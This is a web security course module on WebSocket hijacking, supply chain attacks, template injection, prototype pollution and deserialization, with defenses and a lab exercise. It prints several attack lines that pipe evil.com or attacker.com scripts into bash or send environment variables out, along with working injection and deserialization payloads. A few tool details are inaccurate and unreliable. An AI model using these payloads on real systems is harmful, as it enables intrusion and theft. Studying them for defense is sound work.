# Module 10: Modern Attack Surfaces

Modern web applications have expanded beyond traditional HTTP request/response patterns. WebSockets provide real-time bidirectional communication. Supply chain attacks target the dependencies that applications import. Template engines execute server-side logic that can be exploited. JavaScript prototypal inheritance creates prototype pollution vulnerabilities. Deserialization of untrusted data enables remote code execution. These attack surfaces are newer, less understood, and often overlooked in traditional security assessments.

## WebSocket Security

WebSockets provide persistent, bidirectional communication between client and server. They are used for chat applications, live feeds, collaborative editing, gaming, and real-time notifications. The WebSocket handshake begins with an HTTP Upgrade request:

```
GET /ws HTTP/1.1
Host: app.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

The server responds with:

```
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

After the handshake, the connection remains open and both sides can send messages at any time. This creates security challenges that do not exist in traditional HTTP.

### WebSocket Hijacking

WebSocket hijacking (Cross-Site WebSocket Hijacking, CSWSH) exploits the fact that WebSocket connections are initiated via HTTP and may include cookies. If the WebSocket server does not validate the Origin header:

```
GET /ws HTTP/1.1
Host: app.example.com
Upgrade: websocket
Connection: Upgrade
Origin: https://evil.com
Sec-WebSocket-Key: xxxxx
Sec-WebSocket-Version: 13
```

If the server accepts the connection from `evil.com`, an attacker's page can establish a WebSocket connection to the target and receive real-time data. The attacker's JavaScript:

```javascript
const ws = new WebSocket('wss://app.example.com/ws');
ws.onmessage = function(event) {
    // Exfiltrate real-time data
    fetch('https://evil.com/exfil', {
        method: 'POST',
        body: event.data
    });
};
```

The victim must visit the attacker's page while authenticated to the target. The WebSocket connection inherits the victim's cookies, and the server treats it as an authenticated session.

**Defense**: Validate the Origin header during the WebSocket handshake. Use CSRF tokens in the initial HTTP upgrade request. Do not rely solely on cookies for WebSocket authentication: use tokens in the first message or as a query parameter that is validated before the handshake completes.

### WebSocket Injection

If messages received through WebSockets are rendered in the DOM without sanitization, XSS is possible:

```javascript
const ws = new WebSocket('wss://app.example.com/chat');
ws.onmessage = function(event) {
    // DANGEROUS - renders HTML from WebSocket
    document.getElementById('chat').innerHTML += event.data;
};
```

An attacker sends a message containing HTML/JavaScript through the WebSocket protocol. The message is stored by the chat server and delivered to all connected clients. The clients render it as HTML, executing the injected script.

WebSocket messages are not automatically HTML-encoded. Every message must be sanitized before rendering.

### WebSocket Denial of Service

WebSockets maintain persistent connections, consuming server resources. An attacker can:

- Open thousands of WebSocket connections, exhausting server memory and file descriptors.
- Send messages at maximum rate, overwhelming message processing.
- Send malformed frames that cause parsing errors and resource leaks.
- Send oversized messages that consume excessive memory.

```
# Tool for WebSocket DoS
wscat -c wss://app.example.com/ws -x "AAAA...AAAA" --connect-rate 1000
```

**Defense**: Limit the number of WebSocket connections per IP/user. Implement message rate limiting. Set maximum message size. Close idle connections. Monitor connection counts and message rates for anomalies.

## Supply Chain Attacks

Supply chain attacks target the software supply chain: the dependencies, packages, and tools that applications use. Instead of attacking the application directly, the attacker compromises a component that the application trusts.

### Dependency Confusion

Dependency confusion exploits the naming of packages across public and private registries. If a company uses a private npm registry with a package named `@company/internal-tool`, an attacker publishes a package named `internal-tool` (without the scope) on the public npm registry. When a developer or CI/CD pipeline installs dependencies:

```bash
npm install internal-tool
```

npm might resolve to the public package instead of the private one if the registry configuration is incorrect. The attacker's package executes arbitrary code during installation:

```javascript
// attacker's package - index.js
const { execSync } = require('child_process');
const https = require('https');

// Steal environment variables and send to attacker
const data = JSON.stringify(process.env);
const options = {
    hostname: 'evil.com',
    path: '/collect',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
};

const req = https.request(options);
req.write(data);
req.end();

// Also install a backdoor
execSync('curl https://evil.com/backdoor.sh | bash');
```

**Defense**: Use scoped packages (`@company/package-name`). Configure package managers to prefer private registries. Use lock files (package-lock.json, yarn.lock) to pin exact versions. Implement package signature verification.

### Typosquatting

Typosquatting publishes packages with names similar to popular packages, targeting common typos:

- `express` → `expres`, `expresss`, `exprss`
- `lodash` → `lodahs`, `lodashs`, `loda`
- `react` → `reactt`, `reacr`, `raect`

The typosquatting package contains a payload that executes during installation or import:

```javascript
// lodashs (typo of lodash)
module.exports = require('lodash'); // Legitimate functionality
// But also:
require('child_process').exec('curl https://evil.com/shell.sh | bash');
```

**Defense**: Use exact package names with version pinning. Implement typosquatting detection tools. Use npm's `--ignore-scripts` flag to prevent post-install scripts. Audit dependencies before installation.

### Compromised Dependencies

Even legitimate packages can be compromised. The attacker gains access to a maintainer's account and publishes a malicious version:

**event-stream (2018)**: The popular npm package `event-stream` was taken over by a new maintainer who added a dependency (`flatmap-stream`) that contained a payload targeting the Copay Bitcoin wallet. The malicious code was obfuscated and only activated in specific environments.

**ua-parser-js (2021)**: The npm package `ua-parser-js` (7M weekly downloads) was hijacked. The attacker published versions 0.7.29 and 1.0.0 containing cryptocurrency miner and password stealer payloads.

**colors.js (2022)**: The maintainer of the `colors` package (20M weekly downloads) intentionally pushed a broken version that printed garbled text, as a protest against companies using his package without compensation.

**Defense**: Use lock files to pin dependency versions. Audit dependencies periodically with tools like `npm audit`, Snyk, or Dependabot. Monitor for unusual changes in dependencies. Implement a private registry that mirrors and audits public packages before making them available.

### SolarWinds-Style Supply Chain Attack

The SolarWinds attack (discovered December 2020) was one of the most sophisticated supply chain attacks in history:

1. Attackers compromised the build system for SolarWinds Orion, a network management platform used by 18,000+ organizations including US government agencies.
2. They injected a backdoor (SUNBURST) into the Orion update process. The backdoor was compiled into the legitimate software and digitally signed with SolarWinds' certificate.
3. The update was distributed to all 18,000+ customers through the normal update mechanism.
4. The SUNBURST backdoor waited two weeks before activating, evading sandbox analysis.
5. Once active, it communicated with command-and-control servers using DNS queries disguised as legitimate SolarWinds traffic.
6. Attackers used the backdoor to gain initial access, then moved laterally through networks using stolen credentials.

**Impact**: US Treasury, Commerce, State, and Energy departments compromised. FireEye, Microsoft, and Intel compromised. The attackers had access for 9+ months before detection.

**Lessons for web application security**:

- Verify the integrity of build artifacts. Use reproducible builds and cryptographic signatures.
- Monitor outbound network connections from build servers and CI/CD pipelines.
- Implement network segmentation to limit lateral movement.
- Use code signing certificates with hardware security modules (HSMs) to prevent unauthorized signing.

## Server-Side Template Injection (SSTI)

SSTI occurs when user input is incorporated into a server-side template without proper escaping. The template engine processes the input as template syntax, enabling code execution.

### Jinja2 (Python/Flask)

Flask uses Jinja2 templates. If user input is rendered with the `|safe` filter or in a raw template string:

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name')
    # SSTI vulnerability - user input is directly rendered as template
    return render_template_string(f'Hello, {name}!')
```

If the name parameter is `{{ 7*7 }}`, the response is "Hello, 49!": the template engine evaluated the expression.

To achieve code execution:

```
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

This lists all loaded Python classes. The attacker identifies a useful class (like `subprocess.Popen` or `os._wrap_close`) and uses it to execute commands:

```
{{ ''.__class__.__mro__[2].__subclasses__()[213]('id', shell=True, stdout=-1).communicate() }}
```

The class index (213) varies by Python version and loaded modules. The attacker must enumerate the subclasses to find the right one.

**Automatic exploitation**: The `tplmap` tool automates SSTI exploitation for multiple template engines:

```bash
tplmap -u 'https://target.com/greet?name=test'
```

### Twig (PHP)

Twig is a PHP template engine. SSTI in Twig:

```
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
```

This registers `exec` as a filter callback and uses it to execute the `id` command.

### FreeMarker (Java)

FreeMarker is a Java template engine. SSTI in FreeMarker:

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

This creates an instance of the `Execute` class and runs the `id` command.

### Velocity (Java)

Apache Velocity SSTI:

```
#set($str=$class.inspect("java.lang.String"))
#set($chr=$class.inspect("java.lang.Character"))
#set($ex=$class.inspect("java.lang.Runtime").getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

### Prevention

Never render user input as template code. Use parameterized templates:

```python
# DANGEROUS
return render_template_string(f'Hello, {name}!')

# SAFE - name is treated as data, not template syntax
return render_template_string('Hello, {{ name }}!', name=name)
```

## Prototype Pollution in JavaScript

Prototype pollution exploits JavaScript's prototypal inheritance. When an application merges user-controlled objects into existing objects, the attacker can inject properties into the base `Object.prototype`, affecting all objects:

```javascript
const merge = (target, source) => {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            target[key] = merge(target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
};

// Attacker payload
const payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, payload);

// Now every object has isAdmin = true
const user = {};
console.log(user.isAdmin); // true
```

### Impact of Prototype Pollution

Prototype pollution can lead to:

**Privilege escalation**: If the application checks properties from polluted prototypes:

```javascript
if (user.isAdmin) {
    // Grant admin access
}
```

**XSS**: If polluted properties are rendered in the DOM:

```javascript
// Pollute __html__ property
{"__proto__": {"__html__": "<script>alert(1)</script>"}}

// Application renders it
element.innerHTML = object.__html__;
```

**Denial of service**: If the application processes polluted properties in ways that cause errors:

```javascript
// Pollute constructor
{"__proto__": {"constructor": null}}

// Application tries to create new objects
const obj = new (obj.constructor)(); // TypeError
```

### Prototype Pollution Gadgets

Prototype pollution becomes exploitable through "gadget" functions: existing code that processes polluted properties in dangerous ways:

**jQuery (CVE-2019-11358)**: jQuery's `$.extend()` function merges objects recursively, including `__proto__`. If the application uses jQuery and another vulnerability allows setting properties, the polluted prototype can trigger XSS or code execution.

**AngularJS (CVE-2020-7676)**: If the application uses AngularJS with template expressions, prototype pollution can inject expressions that execute in the AngularJS context.

**Node.js merge**: The `merge` package recursively merges objects, including `__proto__`. Applications using this package to merge user input into configuration objects are vulnerable.

### Prevention

- Use `Object.create(null)` to create objects without prototype.
- Freeze `Object.prototype` (not practical for most applications).
- Validate input: reject objects containing `__proto__`, `constructor`, or `prototype` keys.
- Use Map instead of plain objects for user-controlled data.
- Use libraries that protect against prototype pollution (e.g., `lodash.merge` with `isPlainObject` checks).

## Deserialization Attacks

Deserialization converts serialized data (JSON, XML, binary formats) back into objects. If an application deserializes untrusted data without validation, the attacker can inject malicious object structures.

### Java Deserialization

Java's native serialization mechanism (`ObjectInputStream`) is notoriously vulnerable. If an application deserializes user input:

```java
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject(); // Deserializes untrusted data
```

The attacker crafts a serialized object that, when deserialized, executes arbitrary code. The payload uses "gadget chains": sequences of existing classes that, when deserialized, execute unintended operations:

**Common gadget chains**:

- **Commons Collections**: Uses `InvokerTransformer` and `LazyMap` to execute arbitrary methods during deserialization.
- **Spring Framework**: Uses Spring's `PartiallyComparableAdvisorHolder` to execute methods through AOP proxy chains.
- **Apache Commons Beanutils**: Uses `PropertyUtils.getProperty` to invoke arbitrary getters.

**Tools**: `ysoserial` generates deserialization payloads:

```bash
java -jar ysoserial.jar CommonsCollections1 'curl attacker.com/shell.sh | bash' > payload.bin
```

**Prevention**: Never deserialize untrusted data. If deserialization is necessary, use allowlisting of permitted classes. Implement integrity checks (HMAC) on serialized data. Consider using JSON instead of native serialization.

### PHP Deserialization

PHP's `unserialize()` function is equally dangerous:

```php
$data = unserialize($_COOKIE['user_data']);
```

PHP object injection uses magic methods (`__wakeup`, `__destruct`, `__toString`) that execute during deserialization. Gadget chains in common PHP libraries:

**PHPGGC**: A framework for generating PHP deserialization payloads for various libraries (Symfony, Laravel, Doctrine, Monolog).

```bash
php phpggc Laravel/RCE1 system 'id' | base64
```

The payload, when deserialized, executes the `id` command through Laravel's notification system.

**Prevention**: Never unserialize untrusted data. Use `json_decode()` instead. If unserialize is necessary, use `allowed_classes` option to restrict which classes can be deserialized: `unserialize($data, ['allowed_classes' => false])`.

### Python Pickle Deserialization

Python's `pickle` module is designed for serializing Python objects. It is inherently unsafe for untrusted data because pickle can execute arbitrary code during deserialization:

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
# Deserializing this payload executes 'id'
```

**Prevention**: Never unpickle untrusted data. Use JSON for serialization. If pickle is necessary, implement HMAC verification on the serialized data.

### .NET Deserialization

.NET applications using `BinaryFormatter` are vulnerable to deserialization attacks. The attacker crafts a serialized object that executes code during deserialization:

```csharp
BinaryFormatter formatter = new BinaryFormatter();
object obj = formatter.Deserialize(inputStream); // Vulnerable
```

**Tools**: `ysoserial.net` generates .NET deserialization payloads:

```
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami"
```

**Prevention**: Never use `BinaryFormatter` with untrusted data. Use `DataContractSerializer` or `JsonSerializer` instead. Implement type restrictions and validation.

## Practical Exercise: Modern Attack Surfaces Lab

1. **WebSocket testing**: Identify WebSocket endpoints using browser DevTools (Network tab, WS filter). Test for Origin validation, authentication, and message sanitization. Attempt to inject messages and hijack connections.

2. **Supply chain analysis**: Examine the application's dependency manifest (package.json, requirements.txt, pom.xml). Identify outdated dependencies, known vulnerabilities, and typosquatting risks. Use `npm audit` or equivalent tools.

3. **SSTI testing**: Identify template rendering in the application. Test with template syntax (`{{ 7*7 }}`, `${ 7*7 }`, `<%= 7*7 %>`). If template injection is confirmed, escalate to code execution using language-specific techniques.

4. **Prototype pollution**: If the application uses JavaScript, test for prototype pollution by sending objects with `__proto__` keys. Check whether polluted properties affect application behavior.

5. **Deserialization**: Identify serialized data in cookies, parameters, or request bodies. Test for insecure deserialization using language-specific tools (ysoserial for Java, PHPGGC for PHP, phpggc for Python).

6. **Real-world scenario**: Combine two or more modern attack techniques. Options include: SSTI to RCE, prototype pollution to XSS, WebSocket hijacking to data exfiltration, supply chain attack simulation.

Time limit: 75 minutes. Grading criteria: WebSocket security testing (15%), supply chain analysis (15%), SSTI exploitation (20%), prototype pollution (15%), deserialization attacks (20%), combined attack scenario (15%).
